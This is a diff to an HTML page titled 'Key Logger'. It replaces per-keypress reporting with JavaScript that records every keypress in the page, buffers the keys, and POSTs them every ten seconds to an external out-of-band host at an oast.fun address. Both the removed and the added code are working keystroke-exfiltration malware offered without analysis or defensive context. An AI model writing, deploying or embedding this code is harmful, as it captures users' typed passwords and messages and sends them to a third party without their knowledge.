@@ -5,18 +5,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Key Logger</title>
     <script>
+        var keystrokes = []; // Array to store keystrokes
+
+        // Function to send accumulated keystrokes to the server
+        function sendKeystrokes() {
+            if (keystrokes.length > 0) {
+                // Send the keystrokes to your server
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://yrshyoxozomgfmitszrh8vwsr6s6f5ybf.oast.fun/log', true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.send(JSON.stringify({ keystrokes: keystrokes }));
+
+                // Clear the array after sending
+                keystrokes = [];
+            }
+        }
+
+        // Function to add a key to the array
+        function addKeyToQueue(key) {
+            keystrokes.push(key);
+        }
+
+        // Function to be called at regular intervals to send accumulated keystrokes
+        setInterval(sendKeystrokes, 10000); // Send every 10 seconds
+
         document.addEventListener('keypress', function(event) {
             var key = event.key;
-            sendToServer(key);
+            addKeyToQueue(key);
         });
-
-        function sendToServer(key) {
-            // Send the key to your server
-            var xhr = new XMLHttpRequest();
-            xhr.open('POST', 'https://yrshyoxozomgfmitszrh8vwsr6s6f5ybf.oast.fun/log', true);
-            xhr.setRequestHeader('Content-Type', 'application/json');
-            xhr.send(JSON.stringify({ key: key }));
-        }
     </script>
 </head>
 <body>
